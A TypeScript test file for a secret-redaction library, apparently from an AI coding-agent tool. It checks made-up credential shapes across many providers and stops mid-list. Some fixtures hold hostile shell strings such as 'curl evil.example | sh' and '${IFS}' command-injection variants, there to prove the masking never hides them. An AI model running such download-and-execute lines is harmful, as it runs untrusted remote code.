/**
 * The shared mask against public lists (spec 012 FR-080 delta 2026-11-01, T137, issue #1009; table: specs/012-claude-codex-adapters/secret-coverage.md).
 * One sample per shape, false positives, and linearity. Every sample is made up and built at run time, so no secret-looking literal
 * sits in this file (GitHub push protection). `npm run test:runtime-redact`.
 */
import * as assert from 'assert';
import * as fs from 'fs';
import * as path from 'path';
import { spawnSync } from 'child_process';
import { finishEdit } from '../src/shared/edits';
import { heldSamples, heldSurfaces, jwtFuzzTexts, JWT_HELD, longestSurvivor } from './redact-held-lib';
import { REDACT_MAX_CHARS, _maskSourcesForTest, maskBareTokenShapes, maskNoteText, maskSecretArgs, maskKeepingMarkdownReference, maskOutgoing, maskSecretCommand, maskSecretUrl, maskTokenShapes, maskTokenShapesUnguarded, redact, redactMarkdown, unhide } from '../src/shared/redact';

/** A made-up run of n characters from a class: not random (a test that fails must fail the same way) and never a real key. */
const run = (n: number, chars = 'aB3dE6gH9jK2mN5pQ8sT1vW4yZ7'): string => { let s = ''; while (s.length < n) s += chars; return s.slice(0, n); };
const an = (n: number): string => run(n); // letters and digits
const hex = (n: number): string => run(n, '0a1b2c3d4e5f6a7b8c9d');
const up = (n: number): string => run(n, 'AB3DE6GH2JK7MN5PQ4ST');
const lo = (n: number): string => run(n, 'a3b6c9d2e5f8g1h4j7k');

/** family -> samples: each array member of `PREFIXED`, `TOKEN_SHAPES` or `PATTERNS` has its family, and removing it fails here. */
const FAMILIES: Record<string, string[]> = {
  awsKeyIds: ['AK' + 'IA' + up(16), 'AS' + 'IA' + up(16), 'AB' + 'IA' + up(16), 'AC' + 'CA' + up(16), 'A3' + 'TA' + up(16)],
  bedrock: ['AB' + 'SK' + an(120) + '==', 'bedrock-' + 'api-key-' + an(40)],
  google: ['AI' + 'za' + an(35), 'ya' + '29.' + an(40), 'GOC' + 'SPX-' + an(28), 'GO' + 'OG1' + up(50)],
  entra: [an(3) + '8' + 'Q~' + an(33), '_a.' + '8' + 'Q~' + an(33), '~ab' + '8' + 'Q~' + an(33), '.ab' + '8' + 'Q~' + an(33)],
  altCloud: ['LT' + 'AI' + an(20)],
  doCloudflare: ['do' + 'p_v1_' + hex(64), 'do' + 'o_v1_' + hex(64), 'do' + 'r_v1_' + hex(64), 'v1.' + '0-' + hex(24) + '-' + hex(146), 'cf' + 'ut_' + an(40), 'cf' + 'at_' + an(40), 'cf' + 'k_' + an(40)],
  publicLists: ['vc' + 'c_' + an(50), 'nf' + 'p_' + an(40), 'rn' + 'd_' + an(32), 'xa' + 'i-' + an(80), 'nv' + 'api-' + an(60), 'cs' + 'k-' + an(48), 'pc' + 'sk_' + an(60), 'fw' + '_' + an(24), 'BB' + 'DC-' + an(44), 'CF' + 'PAT-' + an(43), 'un' + 'key_' + an(30), 'bk' + 'ua_' + hex(40), 'li' + 'n_oauth_' + an(40), 'sk' + '.eyJ' + an(40)],
  publicListsB64: ['1/' + '/0' + an(40), 'AK' + 'LT' + an(30), 'oy' + '2' + lo(43), 'ci' + 'o' + an(32), 'AT' + 'BB' + an(30)],
  hosting: ['HR' + 'KU-' + an(60), 'fo' + '1_' + an(43), 'fm' + '1r_' + an(120), 'fm' + '2_' + an(120), 'vc' + 'p_' + an(50), 'vc' + 'k_' + an(50)],
  databases: ['sb' + 'p_' + hex(40), 'sb_' + 'secret_' + an(30), 'na' + 'pi_' + lo(50), 'psc' + 'ale_tkn_' + an(40), 'psc' + 'ale_pw_' + an(40), 'psc' + 'ale_oauth_' + an(40), 'Ast' + 'raCS:' + an(24) + ':' + hex(64), '4b' + '1d' + an(38), 'da' + 'pi' + hex(32)],
  infra: [an(14) + '.at' + 'lasv1.' + an(70), 'hv' + 's.' + an(90), 'hv' + 'b.' + an(140), 'dp' + '.pt.' + an(43), 'dp' + '.st.' + an(43), 'pu' + 'l-' + hex(40), 'op' + 's_eyJ' + an(250), 'A3' + '-' + up(6) + '-' + up(11) + '-' + up(5) + '-' + up(5) + '-' + up(5), 'AGE-' + 'SECRET-KEY-1' + up(58), 'ts' + 'key-' + an(40), 'sha' + '256~' + an(43)],
  github: ['gh' + 'p_' + an(36), 'gh' + 'o_' + an(36), 'gh' + 'u_' + an(36), 'gh' + 's_' + an(36), 'gh' + 'r_' + an(36), 'github' + '_pat_' + an(22) + '_' + an(59)],
  gitlab: ['gl' + 'pat-' + an(20), 'gl' + 'dt-' + an(20), 'gl' + 'rt-' + an(20), 'gl' + 'ft-' + an(20), 'gl' + 'ffct-' + an(20), 'gl' + 'imt-' + an(25), 'gl' + 'agent-' + an(50), 'gl' + 'oas-' + an(64), 'gl' + 'soat-' + an(20), 'gl' + 'ptt-' + hex(40), 'gl' + 'cbt-a1_' + an(20), 'GR' + '1348941' + an(20)],
  atlassian: ['ATA' + 'TT3' + an(40)],
  ci: ['CCI' + 'PAT_' + an(30), 'CCI' + 'PRJ_' + an(30), 'sg' + 'p_' + hex(40), 'pa' + 't.' + an(22) + '.' + an(24) + '.' + an(20), 'PM' + 'AK-' + hex(24) + '-' + hex(34)],
  ai: ['sk' + '-' + an(40), 'sk' + '-proj-' + an(60), 'sk' + '-ant-api03-' + an(95), 'gs' + 'k_' + an(52), 'pp' + 'lx-' + an(48)],
  aiTools: ['hf' + '_' + an(34), 'api' + '_org_' + an(34), 'r8' + '_' + an(37), 'tv' + 'ly-' + an(32), 'ls' + 'v2_pt_' + hex(32) + '_' + hex(10)],
  registries: ['np' + 'm_' + an(36), 'py' + 'pi-Ag' + an(60), 'ruby' + 'gems_' + hex(48), 'CLO' + 'JARS_' + lo(60), 'AK' + 'Cp' + an(69), 'cm' + 'Vmd' + an(59), 'dc' + 'kr_pat_' + an(27)],
  mail: ['SG' + '.' + an(22) + '.' + an(43), 'ke' + 'y-' + hex(32), hex(32) + '-' + 'us12', 'xke' + 'ysib-' + hex(64) + '-' + an(16), 're' + '_' + an(8) + '_' + an(24), 'S' + 'K' + hex(32), 'EA' + 'AC' + an(120), '1234567' + '89012345' + '|' + an(30), 'A'.repeat(22) + 'B' + an(30) + '%2B' + an(60)],
  payment: ['sk' + '_live_' + an(24), 'rk' + '_live_' + an(24), 'sk' + '_test_' + an(24), 'wh' + 'sec_' + an(32), 'sq' + '0atp-' + an(22), 'sq' + '0csp-' + an(43), 'EA' + 'AA' + an(60), 'rz' + 'p_live_' + an(14), 'FLW' + 'SECK-' + an(32) + '-X', 'access-' + 'production-' + hex(8) + '-' + hex(4) + '-' + hex(4) + '-' + hex(4) + '-' + hex(12), 'sh' + 'pat_' + hex(32), 'sh' + 'pss_' + hex(32), 'pd' + 'l_live_' + an(40), 'duf' + 'fel_live_' + an(43)],
  devTools: ['li' + 'n_api_' + an(40), 'nt' + 'n_' + an(46), 'sn' + 'tryu_' + hex(64), 'sn' + 'trys_' + an(80), 'gl' + 'c_' + an(40), 'gl' + 'sa_' + an(32) + '_' + hex(8), 'NR' + 'AK-' + up(27), 'NR' + 'II-' + an(32), 'NR' + 'JS-' + hex(19), 'dt' + '0c01.' + up(24) + '.' + up(64), 'ph' + 'x_' + an(40), 'sl' + '.' + an(135), 'pa' + 't' + an(14) + '.' + hex(64), 'pn' + 'u_' + an(36), 'rd' + 'me_' + lo(70), 'ship' + 'po_live_' + hex(40), 'EZ' + 'AK' + an(54), 'ic' + 'o-' + an(32), 'AP' + 'I-' + up(26), 'fi' + 'o-u-' + an(64), 's-' + 's4t2ud-' + hex(64), an(6) + '_' + an(29) + '_mmk', 'sm' + '_pat_' + an(16), 'tk' + '-us-' + an(48), 'p8' + 'e-' + an(32), 'sc' + '_' + an(10) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40), 'eyJ' + 'rIjoi' + an(80), 'sc' + '_' + an(30) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40), 'authress' + '_' + an(30) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40)],
  skAntGlued: ['x' + 'sk-ant-' + an(8), '1' + 'sk-ant-' + an(12)],
  bearer: ['Bea' + 'rer ' + an(30)],
  jwt: ['ey' + 'J' + an(20) + '.ey' + 'J' + an(30) + '.' + an(30)],
  slack: ['xo' + 'xb-' + an(20), 'xa' + 'pp-1-' + an(20), 'xo' + 'xa-' + an(8)],
  slackLegacy: ['xo' + 'xo-1234-5678-9012-' + hex(16)],
  slackHook: ['https://hooks.sl' + 'ack.com/services/T' + up(8) + '/B' + up(8) + '/' + an(24)],
  discordHook: ['https://disc' + 'ord.com/api/webhooks/123456789012/' + an(60)],
  teamsHook: ['https://acme.web' + 'hook.office.com/webhookb2/' + hex(8) + '-' + hex(4) + '@' + hex(8) + '/IncomingWebhook/' + hex(32) + '/' + hex(8)],
  telegram: ['1234' + '56789:' + an(35), 'https://api.telegram.org/bot' + '123456789:' + an(35) + '/getMe'],
  discordBot: ['M' + 'T' + an(24) + '.' + an(6) + '.' + an(38)],
  keyBlock: ['-----BEGIN RSA PRI' + 'VATE KEY-----\n' + an(64) + '\n-----END RSA PRI' + 'VATE KEY-----', '-----BEGIN OPENSSH PRI' + 'VATE KEY-----\n' + an(64) + '\n-----END OPENSSH PRI' + 'VATE KEY-----', '-----BEGIN PRI' + 'VATE KEY-----\n' + an(64), '-----BEGIN PGP PRI' + 'VATE KEY BLOCK-----\n\n' + an(64) + '\n-----END PGP PRI' + 'VATE KEY BLOCK-----', '-----begin encrypted pri' + 'vate key-----\n' + an(64) + '\n-----end encrypted pri' + 'vate key-----'],
  authorization: ['Authori' + 'zation: ' + an(20)],
  cookie: ['Coo' + 'kie: sid=' + an(20) + '; other=' + an(10), 'set-coo' + 'kie: sid=' + an(20), 'Coo' + 'kie: a="' + an(20) + '"; b=' + an(10), 'Coo' + 'kie: sid=' + an(3000)],
  cookieQuoted: ['"Coo' + 'kie": "sid=' + an(20) + '"', '{"set-coo' + 'kie":"sid=' + an(20) + '"}', '\\"coo' + 'kie\\":\\"sid=' + an(20) + '\\"'],
  curlUser: ['curl -u me:p4' + 'ss' + an(8) + ' https://h', 'curl -fsSL --user "me:p4' + 'ss' + an(8) + '" h', 'curl -sSu me:p4' + 'ss' + an(8), 'curl --user=me:p4' + 'ss' + an(8), 'curl -u me:' + an(800)],
  urlCredential: ['https://user:p4' + 'ss' + an(8) + '@host.example/x', 'redis://:p4' + 'ss' + an(8) + '@host.example'],
  copilotTid: ['ti' + 'd=abcdef12;exp=1;' + an(20), 'ti' + 'd=abcdef12;exp=1;' + an(2500)],
  queryValue: ['https://x.example/a?code=' + an(20), 'https://x.blob.example/a?sv=2020&sig=' + an(30), 'https://x.example/a?X-Amz-' + 'Signature=' + hex(64), 'https://x.example/a?x-goog-' + 'signature=' + hex(64), 'https://x.blob.example/a?sig=' + an(5000)],
  named: ['aws_secret_' + 'access_key=' + an(40), 'AWS_SESSION_' + 'TOKEN=' + an(40), 'pass' + 'word=' + an(12), 'DB_PASS' + 'WORD=' + an(12), '"pass' + 'word": "' + an(12) + '"', '\\"client_' + 'secret\\":\\"' + an(30) + '\\"', 'api_' + 'key: ' + an(32), 'x-api-' + 'key: ' + an(32), 'token := "' + an(16) + '"', 'myApi' + 'Key=' + an(16), 'AccountKey=' + an(88), 'SharedAccessKey=' + an(44), '_authToken=' + hex(36), '_gitlab_session=' + hex(32), 'pwd=' + an(10), 'password=' + run(24, 'correct+horse+battery'),
    'aws_secret_' + 'access_key=/' + an(39), 'AccountKey=/' + an(87), 'pass' + 'word=$uperS3cret123', 'pass' + 'word=(Sup3rSecret99)', 'pass' + 'word=Sup3r(S3cret)99', 'pass' + 'word=Summer2024\\Secure!9', 'pass' + 'word=' + an(5000)],
  netrc: ['machine h.example login me pass' + 'word p4ss' + an(8), 'machine h.example\n  login me\n  pass' + 'word p4ss' + an(8), 'machine h.example pass' + 'word p4ss' + an(8)],
};

let count = 0;
for (const [family, samples] of Object.entries(FAMILIES)) {
  for (const s of samples) {
    count++;
    // the last characters of the secret itself (a URL credential's host and a bot URL's method are not secret)
    const body = s.replace(/@host\.example.*$|\/getMe$| https:\/\/h$|" h$|[\\"}]+$/, '').slice(-8);
    for (const [label, out] of [['redact', redact(`see ${s} now`, {})], ['maskTokenShapes', maskTokenShapes(`see ${s} now`, '[redacted]')]] as const) {
      assert.ok(out.includes('[redacted]'), `${family}: ${label} masks ${s.slice(0, 16)}…`);
      assert.ok(!out.includes(body), `${family}: ${label} leaves no tail of ${s.slice(0, 16)}…`);
    }
    assert.strictEqual(maskTokenShapes(s, '[s]'), maskTokenShapesUnguarded(s, '[s]'), `${family}: the guard changes nothing on ${s.slice(0, 16)}…`);
  }
}
// the start every shape shares: after `_`, a quote, an encoded byte, a JSON escape
for (const s of ['np' + 'm_' + an(36), 'sk' + '_live_' + an(24), 'AI' + 'za' + an(35)]) {
  for (const pre of ['"', 'x=', '%3D', '=3D', '\\n', '`']) assert.ok(!redact(pre + s, {}).includes(s.slice(4)), `start after ${pre}`);
}

// A shape added by T137 starts after `%` re-encoded up to 8 times (the old shapes have no limit: redact-held-lib.ts); one more level is a listed limit
for (const s of ['np' + 'm_' + an(36), 'sk' + '_live_' + an(24), 'AI' + 'za' + an(35), 'AB' + 'SK' + an(120)]) {
  for (const depth of [0, 1, 2, 7, 8]) {
    const before = 'q=%' + '25'.repeat(depth) + '3D';
    assert.strictEqual(redact(before + s, {}), before + '[redacted]', `${s.slice(0, 4)}… after % encoded ${depth} more times`);
  }
  const deep = 'q=%' + '25'.repeat(9) + '3D' + s;
  assert.strictEqual(redact(deep, {}), deep, `limit: ${s.slice(0, 4)}… after 9 more`);
}

// Issue #1009's five, in both masks
for (const s of ['np' + 'm_' + an(36), 'AI' + 'za' + an(35), 'sk' + '_live_' + an(24), 'aws_secret_' + 'access_key=' + an(40), 'https://u:p4' + 'ss' + an(8) + '@h.example/']) {
  assert.notStrictEqual(redact(s, {}), s, `redact masks ${s.slice(0, 12)}`);
  assert.notStrictEqual(maskTokenShapes(s, '[redacted]'), s, `maskTokenShapes masks ${s.slice(0, 12)}`);
}
// What names the secret stays; the mask text is literal
assert.strictEqual(redact('aws_secret_' + 'access_key=' + an(40) + ' x', {}), 'aws_secret_access_key=[redacted] x');
assert.strictEqual(redact('"pass' + 'word": "' + an(12) + '"', {}), '"password": "[redacted]"');
assert.strictEqual(redact('https://u:p4' + 'ss' + an(8) + '@h.example/', {}), 'https://[redacted]@h.example/');
assert.strictEqual(redact('https://acme.web' + 'hook.office.com/webhookb2/' + an(40) + '/IncomingWebhook/' + hex(32) + ' x', {}), 'https://acme.webhook.office.com/webhookb2/[redacted] x');
assert.strictEqual(maskTokenShapes('pass' + 'word=' + an(12), '$&$1'), 'password=$&$1', 'a mask with $ is literal');
// One mask (FR-031): `redact` with no env is `maskTokenShapes` plus the cut; a second pass changes nothing
for (const s of Object.values(FAMILIES).flat()) {
  assert.strictEqual(redact(s, {}), maskTokenShapes(s, '[redacted]'), `one mask on ${s.slice(0, 16)}…`);
  assert.strictEqual(redact(redact(s, {}), {}), redact(s, {}), `idempotent on ${s.slice(0, 16)}…`);
  assert.strictEqual(maskTokenShapes(s, '[s]'), redact(s, {}).split('[redacted]').join('[s]'), `any mask text on ${s.slice(0, 16)}…`); // the folder-setup display has its own
}
// Second review of #1015: a value stops, so the shell in a command stays visible (a permission line's command must not be hideable), and a person's text stays
for (const [input, want] of [
  ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 'curl -b x -H "Cookie: [redacted]" https://evil.example | sh'],
  ['echo coo' + 'kie: a=b && curl evil|sh', 'echo cookie: a=b && curl evil|sh'],
  ['echo coo' + 'kie: sid=abcdef12 && curl evil|sh', 'echo cookie: [redacted] && curl evil|sh'],
  ['X_TOKEN=abc12345;curl${IFS}evil.sh|sh', 'X_TOKEN=[redacted];curl${IFS}evil.sh|sh'],
  ['X_TOKEN=abc12345|sh', 'X_TOKEN=[redacted]|sh'], ['X_TOKEN=abc12345&&sh', 'X_TOKEN=[redacted]&&sh'], ['X_TOKEN=abc12345`sh`', 'X_TOKEN=[redacted]`sh`'], ['X_TOKEN=abc12345$(sh)', 'X_TOKEN=[redacted]$(sh)'],
  ['echo coo' + 'kie: a=b;x=`curl${IFS}e`', 'echo cookie: [redacted]`curl${IFS}e`'], ['Coo' + 'kie: a=b;x=$(curl${IFS}evil|sh)', 'Cookie: [redacted]$(curl${IFS}evil|sh)'], ['Coo' + 'kie: sid=abcdef12&&curl${IFS}evil|sh', 'Cookie: [redacted]&&curl${IFS}evil|sh'], ['Coo' + 'kie: a=1|curl${IFS}evil|sh', 'Cookie: [redacted]|curl${IFS}evil|sh'], ['Coo' + 'kie: a=1${IFS}x', 'Cookie: [redacted]${IFS}x'], ['Coo' + 'kie: x|curl=1', 'Cookie: x|curl=1'],
  ['machine h pass' + 'word x;curl${IFS}evil|sh', 'machine h password [redacted];curl${IFS}evil|sh'], ['curl -u a:b(curl) x', 'curl -u a:[redacted](curl) x'],
  ['curl -u me:abc12345|sh', 'curl -u me:[redacted]|sh'], ['curl -u me:abc12345$(sh)', 'curl -u me:[redacted]$(sh)'],
  ['https://x.example/?token=abc12345&page=2&sort=asc#frag', 'https://x.example/?token=[redacted]&page=2&sort=asc#frag'], ['https://x.example/?token=abc12345#frag', 'https://x.example/?token=[redacted]#frag'],
  ['[link](https://x/?token=abc12345)', '[link](https://x/?token=[redacted])'], ['<a href=x?token=abc12345>link</a>', '<a href=x?token=[redacted]>link</a>'],
  ['token=abc12345,region=us-east-1,service=s3', 'token=[redacted],region=us-east-1,service=s3'], ['{token:abc12345,name:bob}', '{token:[redacted],name:bob}'],
  ['**token: abc12345** stays', '**token: [redacted]** stays'], ['{"h":"Coo' + 'kie: sid=1","next":"keep me","url":"https://h"}', '{"h":"Cookie: [redacted]","next":"keep me","url":"https://h"}'], ['(token=abc12345) and more', '(token=[redacted]) and more'],
  ['{"a":"Coo' + 'kie: x=1","b":"Coo' + 'kie: y=2"}', '{"a":"Cookie: [redacted]","b":"Cookie: [redacted]"}'], ['set-coo' + 'kie: sid=abc123; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/', 'set-cookie: [redacted]; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/'],
]) assert.strictEqual(redact(input, {}), want, `stop rule: ${input.slice(0, 40)}`);
// A Cookie or Set-Cookie header whose value has no `=` (one opaque token) is hidden whole (spec 012 FR-168, issue #1159).
{
  const T = 'Tq7' + 'Zk2Xp9Lm4Vb8Nc1Rd5Sf6Gh3Jw0'; // made up
  const C = 'Coo' + 'kie';
  const R = '[redacted]';
  assert.strictEqual(redact(`${C}: EnvSecretValue123; ${T}`, { MY_TOKEN: 'EnvSecretValue123' }), `${C}: ${R}`, 'bare cookie token: a token after an env value');
  for (const [input, want, why] of [
    [`${C}: ${T}`, `${C}: ${R}`, 'opaque token'],
    [`Set-${C}: ${T}; Path=/; HttpOnly`, `Set-${C}: ${R}; HttpOnly`, 'Set-Cookie token: the pairs after it go too, as after a pair'],
    [`${C}: a=1; ${T}`, `${C}: ${R}`, 'pair then a bare token'],
    [`${C}: ${T}; a=1`, `${C}: ${R}`, 'bare token then a short pair'],
    [`${C}: a=1; ${T}; sid=LongSecretVal99`, `${C}: ${R}`, 'a pair after a bare token is scanned too'],
    [`coo` + `kie: ${T}`, `cookie: ${R}`, 'lower-case name'],
    [`COO` + `KIE: ${T}\r\nHost: x`, `COOKIE: ${R}\r\nHost: x`, 'upper case, CRLF'],
    [`${C}: ${T}\nHost: x`, `${C}: ${R}\nHost: x`, 'line feed ends it'],
    [`${C}: ${T}\t`, `${C}: ${R}\t`, 'a tab after it'],
    [`${C}: ${T}   `, `${C}: ${R}   `, 'spaces after it'],
    [`${C}: ${T} ;Path=/`, `${C}: ${R} ;Path=/`, 'space then ;'],
    [`${C}: abcdefgh`, `${C}: ${R}`, 'exactly 8 characters'],
    [`${C}: sid=abcdefgh12; my words here`, `${C}: ${R}; my words here`, 'words after pairs stay'],
    [`${C}: ${T}|tail`, `${C}: ${R}|tail`, 'pipe'],
    [`${C}: ${T} | jq .`, `${C}: ${R} | jq .`, 'spaced pipe'],
    [`${C}: ${T}&x`, `${C}: ${R}&x`, 'ampersand'],
    [`${C}: ${T}\x60x\x60`, `${C}: ${R}\x60x\x60`, 'backtick'],
    [`${C}: ${T}$(id)`, `${C}: ${R}$(id)`, 'command substitution'],
    [`${C}: ${T}\${IFS}x`, `${C}: ${R}\${IFS}x`, 'parameter expansion'],
    [`(${C}: ${T})`, `(${C}: ${R})`, 'round bracket'],
    [`{${C}: ${T}}`, `{${C}: ${R}}`, 'curly bracket'],
    [`[${C}: ${T}]`, `[${C}: ${R}]`, 'square bracket'],
    [`<${C}: ${T}>`, `<${C}: ${R}>`, 'angle bracket'],
    [`${C}: ${T},other`, `${C}: ${R}`, 'comma stays inside the token'],
    [`${C}: "${T}"`, `${C}: ${R}`, 'double-quoted'],
    [`${C}: '${T}'`, `${C}: ${R}`, 'single-quoted'],
    [`${C}: Set-${C}:\nsid=LongSecretVal99`, `${C}: Set-${C}:\n${R}`, 'a head is not a token (the next head still masks its pair)'],
    [`${C}: ${T}\nok`, `${C}: ${R}\nok`, 'next line after it stays'],
    [`curl -H '${C}: ${T}' https://x.example`, `curl -H '${C}: ${R}' https://x.example`, 'curl -H argument'],
    [`{"h":"${C}: ${T}","next":"keep"}`, `{"h":"${C}: ${R}","next":"keep"}`, 'inside a JSON string'],
    [`{\\"h\\":\\"${C}: ${T}\\"}`, `{\\"h\\":\\"${C}: ${R}\\"}`, 'JSON-escaped string'],
    [`{"${C}": "${T}"}`, `{"${C}": "${R}"}`, 'JSON key form'],
    [`{\\"${C}\\":\\"${T}\\"}`, `{\\"${C}\\":\\"${R}\\"}`, 'escaped JSON key form'],
    [`${C}: sid=${T}`, `${C}: ${R}`, 'name=value still hidden'],
    [`${C}: s:${T}.sigFAKEsig123`, `${C}: ${R}`, 'a token with a colon: signed'],
    [`${C}: ${T}:part2secret`, `${C}: ${R}`, 'a token with a colon: after'],
    [`${C}: ab:${T}`, `${C}: ${R}`, 'a token with a colon: before'],
    [`${C}: urn:sess:${T}`, `${C}: ${R}`, 'a token with a colon: two'],
    [`${C}: [${T}]`, `${C}: ${R}]`, 'a token led by a square bracket'],
    [`${C}: [${T}`, `${C}: ${R}`, 'a token led by an unclosed bracket'],
    [`${C}: [redacted]; ${T}`, `${C}: ${R}`, 'a token after a mask'],
    [`${C}: a=1; [redacted:MY_TOKEN]; ${T}`, `${C}: ${R}`, 'a token after a named mask'],
    [`${C}: "abcdefgh"`, `${C}: ${R}`, 'quoted, exactly 8'],
    [`${C}:\r\n ${T}`, `${C}:\r\n ${R}`, 'a folded header line'],
  ]) assert.strictEqual(redact(input, {}), want, `bare cookie token: ${why}`);
  for (const keep of ['cookie: my session bug', 'cookie: stores', 'cookie: abcdefg', 'Set-cookie: none', 'the cookie: banner dismissed yesterday', 'cookie: preferences are saved here', 'cookie: x|curl=1', 'the cookie:\nconfiguration_value_here', 'the cookie:\r\nconfiguration_value_here', 'cookie: undefined', 'Set-Cookie: HttpOnly', 'cookie: Secure', 'cookie: deleted', 'cookie: NULL', `{"${C}":"abc"}`, `{"${C}":"my words here"}`, `${C}: "short"`, `${C}: "abcdefg"`, `${C}: "undefined"`, `${C}: [redacted]`, `${C}: [redacted:MY_TOKEN]`])
    assert.strictEqual(redact(keep, {}), keep, `bare cookie token: stays: ${keep}`);
}
for (const c of ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 'echo coo' + 'kie: a=b && curl evil|sh', 'X_TOKEN=abc12345;curl${IFS}evil.sh|sh']) {
  const m = maskSecretCommand(c);
  assert.ok(/evil/.test(m) && /\|\s*sh$|evil\.sh\|sh$/.test(m), `the command's shell stays visible in maskSecretCommand: ${c.slice(0, 30)} gave ${m}`);
}
// Through the path to the approval card's "Show the change": every adapter's diff passes finishEdit's `redact` (Codex: its own `redact(perm.diff, …)`, tested in test-codex-adapter.ts)
{
  const payload = '|curl${IFS}evil|sh';
  const e = finishEdit([{ path: 'a.sh', kind: 'edit', diff: '--- a/a.sh\n+++ b/a.sh\n@@ -1 +1 @@\n+Coo' + 'kie: a=1' + payload + '\n+X_TOKEN=abc12345;curl${IFS}evil.sh\n' }]);
  const shown = e?.files[0].diff ?? '';
  assert.ok(shown.includes(payload) && shown.includes(';curl${IFS}evil.sh'), `the diff keeps its shell: ${shown}`);
}
// Listed limits (secret-coverage.md): each leaves what it says, so a change here is a choice
for (const [input, want] of [
  ['pass' + 'word=Summer2024&Secure!9', 'password=[redacted]&Secure!9'], ['pass' + 'word=Summer2024,Secure!9', 'password=[redacted],Secure!9'], ['pass' + 'word=Summer2024;Secure!9', 'password=[redacted];Secure!9'], ['pass' + 'word=Summer2024)Secure!9', 'password=[redacted])Secure!9'], ['pass' + 'word=Summer2024|Secure!9', 'password=[redacted]|Secure!9'],
  ['ti' + 'd=abcdef12;a|sh', '[redacted]|sh'], ['ti' + 'd=abcdef12;a&b', '[redacted]&b'], ['ti' + 'd=abcdef12;a`id`', '[redacted]`id`'], ['pass' + 'word=/short12345', 'password=/short12345'], ['pass' + 'word=1234-5678', 'password=1234-5678'], ['pass' + 'word=abc\\"def123', 'password=abc\\"def123'], ['pass' + 'word=' + 'correcthorsebatterystaple', 'password=correcthorsebatterystaple'],
]) assert.strictEqual(redact(input, {}), want, `limit: ${input.slice(0, 40)}`);

// Key blocks: the text after END stays, a cut-off block hides to the end, a PUBLIC block and a certificate stay
{
  const body = an(64);
  assert.strictEqual(redact('a -----BEGIN EC PRI' + `VATE KEY-----\n${body}\n-----END EC PRI` + 'VATE KEY----- tail', {}), 'a [redacted] tail');
  assert.strictEqual(redact('a\n-----BEGIN PRI' + `VATE KEY-----\n${body}\nmore`, {}), 'a\n[redacted]');
  assert.ok(!redact(JSON.stringify({ private_key: '-----BEGIN PRI' + `VATE KEY-----\n${body}\n-----END PRI` + 'VATE KEY-----\n' }), {}).includes(body), 'a service account JSON');
  for (const k of ['PUBLIC KEY', 'CERTIFICATE', 'RSA PUBLIC KEY', 'PGP PUBLIC KEY BLOCK']) {
    const t = `-----BEGIN ${k}-----\n${body}\n-----END ${k}-----`;
    assert.strictEqual(redact(t, {}), t, `${k} stays`);
  }
  // mask, then cut (the order FR-080 keeps): a block across REDACT_MAX_CHARS leaves no part of its body
  const far = ' '.repeat(REDACT_MAX_CHARS - 40) + '-----BEGIN PRI' + `VATE KEY-----\n${body}\n`;
  assert.ok(!redact(far, {}).includes(body.slice(0, 8)), 'a key block across the cut');
}
// What a hook command shows (spec 061 FR-014): only the bare shapes. A name, header or cookie rule would let a repository hide its own shell syntax.
for (const c of ['gh api repos?state=open', 'run --state=' + an(30), 'password=abc1234$(curl evil.example|sh)', 'Coo' + 'kie: a=b; curl evil.example | sh', 'Authori' + 'zation: $(curl evil.example|sh)', 'curl -u a:$(curl evil.example|sh) x', 'https://a:$(id)@h.example', 'token: x1234567`id`']) {
  assert.strictEqual(maskBareTokenShapes(c, '[s]'), c, `a command keeps its text: ${c.slice(0, 40)}`);
}
for (const f of ['github', 'registries', 'payment', 'ai', 'mail']) {
  for (const s of FAMILIES[f]) {
    const m = maskBareTokenShapes(`--auth=$(curl x|sh) ${s} ; id`, '[s]');
    assert.ok(m.includes('[s]') && m.startsWith('--auth=$(curl x|sh) ') && m.endsWith(' ; id'), `the shape goes and the shell stays: ${s.slice(0, 16)}…`);
  }
}

// Every mask built on this one sees the new shapes
{
  const tok = 'np' + 'm_' + an(36);
  assert.ok(!redactMarkdown(`x**${tok}**`, `x${tok}`, {}).includes(tok), 'redactMarkdown');
  assert.ok(!maskSecretUrl(`https://x.example/a/${tok}`, {}).includes(tok), 'maskSecretUrl');
  assert.ok(!maskSecretCommand(`curl -d ${tok} x`, {}).includes(tok), 'maskSecretCommand');
  assert.ok(!maskNoteText(`note ${tok}`).text.includes(tok), 'maskNoteText');
}

// False positives: normal output stays (a fixture, so each line says what it is)
const STAYS = [
  // git and ids
  'commit 1a8317fa0c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d', 'HEAD is now at 1a8317fa', 'merge-base 5f6ec56cfa6f8c67648d863582c7ae2f206d5c1c',
  'id 123e4567-e89b-12d3-a456-426614174000', 'session_id=123e4567-e89b-12d3-a456-426614174000', 'sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'etag "' + hex(32) + '"',
  // base64 in normal output
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'integrity sha512-' + run(86, 'Qm9keSBvZiBhIHBhY2thZ2UgaW4gYSBsb2NrIGZpbGU') + '==', 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7' + run(60, 'vbqajDhA2l5n') + ' me@host',
  // file paths, also where a secret word is next to them
  '/usr/local/lib/node_modules/npm/bin/npm-cli.js', 'C:\\Users\\me\\AppData\\Roaming\\npm\\node_modules', 'src/shared/redact.ts:89:12', '~/.ssh/known_hosts', 'private_key=/home/me/.ssh/id_rsa_work_laptop', 'private_key=./keys/server_2026.pem', 'PWD=/home/me/projects/agent-durbar', 'password_file: /etc/app/secret.txt',
  // code and config
  'token: string', 'password: string;', 'apiKey: undefined', 'const token = getToken123();', 'token = getToken2(a, b);', 'token = await client.getAccessTokenFromConfig()', 'password=$DB_PASS', 'password=$db_pass_2', 'password=$env:DB', 'token_url=https://x.example/1', 'secret=https://x.example/page2', 'auth: https://login.example/v2', 'password: ${DB_PASSWORD}', 'token=%TOKEN%', 'api_key=<your-api-key>', 'secret: true', 'auth: false',
  // words beside a secret word
